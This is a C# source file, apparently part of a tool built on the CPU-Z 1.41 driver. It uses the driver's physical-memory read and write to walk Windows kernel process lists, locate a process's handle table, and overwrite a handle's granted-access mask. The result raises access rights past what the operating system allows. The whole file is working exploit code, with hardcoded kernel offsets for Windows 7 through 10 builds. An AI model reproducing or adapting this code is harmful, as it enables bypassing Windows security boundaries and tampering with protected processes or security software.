using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace cpuz141
{
    public unsafe class ElevateHandle
    {
        #region ENUMS
        [Flags]
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,

            STANDARD_RIGHTS_REQUIRED = 0x000F0000,

            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,

            STANDARD_RIGHTS_ALL = 0x001F0000,

            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

            ACCESS_SYSTEM_SECURITY = 0x01000000,

            MAXIMUM_ALLOWED = 0x02000000,

            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,

            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,

            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,

            WINSTA_ALL_ACCESS = 0x0000037F
        }

        enum supported_versions
        {
            win7_sp1 = 0x060101,
            win8 = 0x060200,
            win81 = 0x060300,
            win10 = 0x0A0000,
            win10_au = 0x0A0001,
            win10_cu = 0x0A0002
        }
        #endregion
        
        private CPUZ g_Driver { get; }
        private Win.process_context g_Context { get; set; }

        // DYNAMIC DATA
        private ulong g_VersionLong { get; }
        private uint g_OffsetDirectoryTable { get; }
        private uint g_OffsetProcessId { get; }
        private uint g_OffsetProcessLinks { get; }
        private uint g_OffsetObjectTable { get; }
        private bool g_bIsWin7 { get; set; } = false;

        public ElevateHandle(CPUZ cpuzdriver)
        {
            g_Driver = cpuzdriver;

            Win._OSVERSIONINFOEXW osvi = new Win._OSVERSIONINFOEXW();
            osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(typeof(Win._OSVERSIONINFOEXW));

            Win.RtlGetVersion(&osvi);
            g_VersionLong = (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | osvi.wServicePackMajor;

            switch ((supported_versions)g_VersionLong)
            {
                case supported_versions.win7_sp1:
                    g_bIsWin7 = true;
                    g_OffsetDirectoryTable = 0x028;
                    g_OffsetProcessId = 0x180;
                    g_OffsetProcessLinks = 0x188;
                    g_OffsetObjectTable = 0x200;
                    break;

                case supported_versions.win8:
                case supported_versions.win81:
                    g_OffsetDirectoryTable = 0x028;
                    g_OffsetProcessId = 0x2e0;
                    g_OffsetProcessLinks = 0x2e8;
                    g_OffsetObjectTable = 0x408;
                    break;

                case supported_versions.win10:
                    {
                        switch (osvi.dwBuildNumber)
                        {
                            case 10240:
                            case 10586:
                            case 14393:
                                g_OffsetDirectoryTable  = 0x028;
                                g_OffsetProcessId       = 0x2E8;
                                g_OffsetProcessLinks    = 0x2F0;
                                g_OffsetObjectTable     = 0x418;
                                break;
                            case 15063:
                                g_OffsetDirectoryTable  = 0x028;
                                g_OffsetProcessId       = 0x2E0;
                                g_OffsetProcessLinks    = 0x2E8;
                                g_OffsetObjectTable     = 0x418;
                                break;
                            //case 10240:
                            //case 10586:
                            //    g_OffsetDirectoryTable = 0x028;
                            //    g_OffsetProcessId = 0x2E8;
                            //    g_OffsetProcessLinks = 0x2F0;
                            //    g_OffsetObjectTable = 0x418;
                            //    break;
                            //case 14393:
                            //    g_OffsetDirectoryTable = 0x028;
                            //    g_OffsetProcessId = 0x2E0;
                            //    g_OffsetProcessLinks = 0x2E8;
                            //    g_OffsetObjectTable = 0x418;
                            //    break;
                            //case 15063:
                            //    g_OffsetDirectoryTable = 0x028;
                            //    g_OffsetProcessId = 0x2E0;
                            //    g_OffsetProcessLinks = 0x2E8;
                            //    g_OffsetObjectTable = 0x418;
                            //    break;

                            default:
                                throw new Exception("Unsupported dwBuildNumber");
                        }
                        break;
                    }

                default:
                    throw new Exception("Unsupported version_long");
            }
        }

        // Native Reconstructs
        Win._HANDLE_TABLE_ENTRY* ExpLookupHandleTableEntryWin7(void* HandleTable, ulong Handle)
        {
            ulong v2;     // r8@2
            ulong v3;     // rcx@2
            ulong v4;     // r8@2
            ulong result; // rax@4
            ulong v6;     // [sp+8h] [bp+8h]@1
            ulong table = (ulong)HandleTable;

            v6 = Handle;
            v6 = Handle & 0xFFFFFFFC;
            if (v6 >= *(uint*)(table + 92))
            {
                result = 0;
            }
            else
            {
                v2 = (*(ulong*)table);
                v3 = (*(ulong*)table) & 3;
                v4 = v2 - (uint)v3;
                if ((uint)v3 > 0)
                {
                    if ((uint)v3 == 1)
                        result = ReadSystemMemory<ulong>((((Handle - (Handle & 0x3FF)) >> 7) + v4)) + 4 * (Handle & 0x3FF);
                    else
                        result = ReadSystemMemory<ulong>((ulong)(ReadSystemMemory<ulong>((ulong)(((((Handle - (Handle & 0x3FF)) >> 7) - (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF)) >> 9) + v4)) + (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF))) + 4 * (Handle & 0x3FF);
                }
                else
                {
                    result = v4 + 4 * Handle;
                }
            }
            return (Win._HANDLE_TABLE_ENTRY*)result;
        }

        Win._HANDLE_TABLE_ENTRY* ExpLookupHandleTableEntry(void* HandleTable, ulong Handle)
        {
            ulong v2; // rdx@1
            long v3; // r8@2
            ulong result; // rax@4
            ulong v5;

            ulong a1 = (ulong)HandleTable;

            v2 = Handle & 0xFFFFFFFFFFFFFFFCu;
            if (v2 >= *(uint*)a1)
            {
                result = 0;
            }
            else
            {
                v3 = (long)*(ulong*)(a1 + 8);
                if ((*(ulong*)(a1 + 8) & 3) > 0)
                {
                    if ((*(uint*)(a1 + 8) & 3) == 1)
                    {
                        v5 = ReadSystemMemory<ulong>((ulong)v3 + 8 * (v2 >> 10) - 1);
                        result = v5 + 4 * (v2 & 0x3FF);
                    }
                    else
                    {
                        v5 = ReadSystemMemory<ulong>(ReadSystemMemory<ulong>((ulong)v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
                        result = v5 + 4 * (v2 & 0x3FF);
                    }
                }
                else
                {
                    result = (ulong)v3 + 4 * v2;
                }
            }
            return (Win._HANDLE_TABLE_ENTRY*)result;
        }

        // MEMORY FUNCTIONS
        T ReadSystemMemory<T>(ulong basepointer)
        {
            var buf = (ulong*)Marshal.AllocHGlobal(Marshal.SizeOf(typeof(T)));

            if (!ReadSystemMemory(basepointer, (ulong)buf, (uint)Marshal.SizeOf(typeof(T))))
                throw new Exception("Read failed");

            T result = (T)Marshal.PtrToStructure((IntPtr)buf, typeof(T));

            Marshal.FreeHGlobal((IntPtr)buf);

            return result;
        }
        bool WriteSystemMemory<T>(ulong basepointer, T value)
        {
            var buf = (ulong)Marshal.AllocHGlobal(Marshal.SizeOf(typeof(T)));
            Marshal.StructureToPtr(value, (IntPtr)buf, false);

            bool success = WriteSystemMemory(basepointer, buf, (uint)Marshal.SizeOf(typeof(T)));

            Marshal.FreeHGlobal((IntPtr)buf);

            return success;
        }
        bool ReadSystemMemory(ulong basepointer, ulong buf, uint len)
        {
            ulong phys = g_Driver.TranslateLinearAddress(g_Context.dir_base, basepointer);
            
            return g_Driver.ReadPhysicalAddress(phys, buf, len);
        }
        bool WriteSystemMemory(ulong basepointer, ulong buf, uint len)
        {
            ulong phys = g_Driver.TranslateLinearAddress(g_Context.dir_base, basepointer);
            
            return g_Driver.WritePhysicalAddress(phys, buf, len);
        }

        // HELPERS
        public static ulong SupGetKernelBase()
        {
            ulong buffer;
            uint bufferSize = 2048;

            buffer = (ulong)Marshal.AllocHGlobal((int)bufferSize);

            uint status = Win.NtQuerySystemInformation(11/*SystemModuleInformation*/, (IntPtr)buffer, (uint)bufferSize, out bufferSize);

            if (status == 0xC0000004L/*STATUS_INFO_LENGTH_MISMATCH*/)
            {
                Marshal.FreeHGlobal((IntPtr)buffer);
                buffer = (ulong)Marshal.AllocHGlobal((int)bufferSize);

                status = Win.NtQuerySystemInformation(11/*SystemModuleInformation*/, (IntPtr)buffer, (uint)bufferSize, out bufferSize);
            }

            if (status != 0)
                throw new Exception("SupGetKernelBaseFailed");

            Win._RTL_PROCESS_MODULES* pmodules = (Win._RTL_PROCESS_MODULES*)buffer;
                                                                           
            return (ulong)pmodules->Modules.ImageBase;
        }
        public static byte* find_kernel_proc(string szName)
        {
            ulong ntoskrnl = Win.LoadLibrary("ntoskrnl.exe");
            ulong krnl_base = SupGetKernelBase();

            ulong fn = Win.GetProcAddress(ntoskrnl, szName);

            return (byte*)(fn - ntoskrnl + krnl_base);
        }
        private Win.process_context find_process_info(uint pid)
        {
            Win.process_context info = new Win.process_context();
            info.pid = 0;

            // 1. Get PsInitialSystemProcess;
            // 2. Iterate _EPROCESS list until UniqueProcessId == pid;
            // 3. Read _KPROCESS:DirectoryTableBase;
            // 4. Profit.

            // Get the pointer to the system EPROCESS
            ulong peprocess = (ulong)find_kernel_proc("PsInitialSystemProcess");

            // Read EPROCESS address
            ulong ntos_entry = g_Driver.ReadSystemAddress<ulong>(peprocess);

            var list_head = ntos_entry + g_OffsetProcessLinks;
            var last_link = g_Driver.ReadSystemAddress<ulong>(list_head + 8);
            var cur_link = list_head;


            do
            {
                var entry = (ulong)cur_link - g_OffsetProcessLinks;

                var unique_pid = g_Driver.ReadSystemAddress<ulong>(entry + g_OffsetProcessId);


                // PID is a match
                if (unique_pid == pid)
                {
                    info.pid = pid;
                    info.dir_base = g_Driver.ReadSystemAddress<ulong>(entry + g_OffsetDirectoryTable);
                    info.kernel_entry = entry;
                    break;
                }
                
                // Go to next process
                cur_link = g_Driver.ReadSystemAddress<ulong>(cur_link);
            } while (cur_link != last_link);

            return info;
        }
        //public bool AttachToSelf(int nTargetPid, out IntPtr hProcess)
        //{
        //    if (nTargetPid > 0)
        //    {
        //        hProcess = Win.OpenProcess(0x1000, false, (uint)nTargetPid);
        //        g_Context = find_process_info((uint)Process.GetCurrentProcess().Id);
        //        return true;
        //    }
        //
        //    return false;
        //}
        public void AttachToSelf()
        {
            g_Context = find_process_info((uint)Process.GetCurrentProcess().Id);
        }
        public bool Attach(uint nOwnerPid)
        {
            if (nOwnerPid > 0)
            {
                g_Context = find_process_info(nOwnerPid);
                return true;
            }

            return false;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct _HANDLE_TABLE
        {
            public ulong TableCode;
            public ulong QuotaProcess;
            public ulong UniqueProcessId;
            public ulong HandleLock;
            public ulong Flink;
            public ulong Blink;
            public ulong HandleContentionEvent;
            public ulong DebugInfo;
            public int ExtraInfoPages;
            public uint Flags;
            public uint FirstFreeHandle;
            public ulong LastFreeHandleEntry;
            public uint HandleCount;
            public uint NextHandleNeedingPool;
            public uint HandleCountHighWatermark;
        }

        public bool ElevateHandleAccess(IntPtr handle, uint DesiredAccess)
        {
            var handle_table_addr = ReadSystemMemory<ulong>(g_Context.kernel_entry + g_OffsetObjectTable);
            var handle_table = ReadSystemMemory<_HANDLE_TABLE>(handle_table_addr);

            Console.WriteLine($"handle_table_addr: {handle_table_addr:X}");;
            
            Win._HANDLE_TABLE_ENTRY* entry_addr;
            
            if (g_bIsWin7)
            {
                entry_addr = ExpLookupHandleTableEntryWin7(&handle_table, (ulong)handle);
            }
            else
            {
                entry_addr = ExpLookupHandleTableEntry(&handle_table, (ulong)handle);
            }

            if ((ulong)entry_addr == 0)
                throw new Exception("ExpLookupHandleTableEntry/7 failed");

            Console.WriteLine($"entry_addr: {(ulong)entry_addr:X}");

            var entry = ReadSystemMemory<Win._HANDLE_TABLE_ENTRY>((ulong)entry_addr);

            Console.WriteLine($"entry.Object: {entry.Object:X}");
            Console.WriteLine($"entry.GrantedAccess: {entry.GrantedAccess:X}");
            
            return WriteSystemMemory((ulong)entry_addr + 8, DesiredAccess);
        }

        private static class Win
        {
            #region STRUCTS
            [StructLayout(LayoutKind.Sequential)]
            public struct _OSVERSIONINFOEXW
            {
                public uint dwOSVersionInfoSize;
                public uint dwMajorVersion;
                public uint dwMinorVersion;
                public uint dwBuildNumber;
                public uint dwPlatformId;
                public fixed byte szCSDVersion[128 * 2/*WCHAR*/];     // Maintenance string for PSS usage
                public ushort wServicePackMajor;
                public ushort wServicePackMinor;
                public ushort wSuiteMask;
                public byte wProductType;
                public byte wReserved;
            }
            [StructLayout(LayoutKind.Sequential)]
            public struct _HANDLE_TABLE_ENTRY
            {
                public ulong Object;
                public ulong GrantedAccess;
                //public fixed byte GrantedAccess[3];
                //
                //public void SetGrantedAccess(uint DesiredAccess)
                //{
                //    fixed (byte* pGrantedAccess = GrantedAccess)
                //    {
                //        byte[] desiredbytes = BitConverter.GetBytes(DesiredAccess);
                //        for (int i = 0; i < 4; i++)
                //            pGrantedAccess[i] = desiredbytes[3 - i];
                //    }
                //}
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct process_context
            {
                public uint pid;
                public ulong dir_base;
                public ulong kernel_entry;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _RTL_PROCESS_MODULES
            {
                public uint NumberOfModules;
                public _RTL_PROCESS_MODULE_INFORMATION Modules;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _RTL_PROCESS_MODULE_INFORMATION
            {
                public void* Section;
                public void* MappedBase;
                public void* ImageBase;
                public uint ImageSize;
                public uint Flags;
                public ushort LoadOrderIndex;
                public ushort InitOrderIndex;
                public ushort LoadCount;
                public ushort OffsetToFileName;
                public fixed sbyte FullPathName[256];
            }
            #endregion
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenProcess(uint processAccess,bool bInheritHandle, uint processId);

            [DllImport("ntdll.dll")]
            public static extern uint NtQuerySystemInformation(uint InfoClass, IntPtr Info, uint Size, out uint Length);

            [DllImport("ntdll.dll")]
            public static extern uint RtlGetVersion(_OSVERSIONINFOEXW* lpVersionInformation);

            [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
            public static extern ulong LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            public static extern ulong GetProcAddress(ulong hModule, string procName);
        }

        
    }
}
